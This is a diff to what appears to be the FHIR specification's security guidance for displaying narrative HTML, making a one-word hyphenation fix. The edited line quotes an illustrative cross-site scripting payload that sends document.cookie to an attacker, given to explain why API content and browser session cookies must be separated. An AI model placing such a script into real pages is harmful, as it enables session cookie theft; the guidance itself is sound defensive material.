@@ -345,7 +345,7 @@ However, care is still needed when displaying the narrative:
  <li>Validate the narrative (the standard FHIR schemas do not allow active content, and the reference implementations won't handle it). Note, though, that external references could still be included in CSS, and removing/preventing these are outside the scope of schemas and reference implementations.</li>
  <li>Ensure that any external references to images or anchors (e.g. outside the resource) do not cause the display software to <a href="http://smartplatforms.org/2014/04/security-vulnerabilities-in-ccda-display/">leak sensitive information in headers</a></li>
  <li>Do not allow external links to run in a privileged context such as the EHR unless you are sure they can be trusted</li>
- <li>Care should be taken to differentiate HTTP RESTful (API) from browser based server content. Specifically, one should separate user session cookies, as an attacker could create content that serves up with content-type "text/html" and has content like "&lt;script&gt;send_to_attacker(document.cookie);&lt;/script&gt;".</li>
+ <li>Care should be taken to differentiate HTTP RESTful (API) from browser-based server content. Specifically, one should separate user session cookies, as an attacker could create content that serves up with content-type "text/html" and has content like "&lt;script&gt;send_to_attacker(document.cookie);&lt;/script&gt;".</li>
 </ul>
 <p>
 Also note that the inclusion of an external reference to an image can allow the server that hosts the image to track 
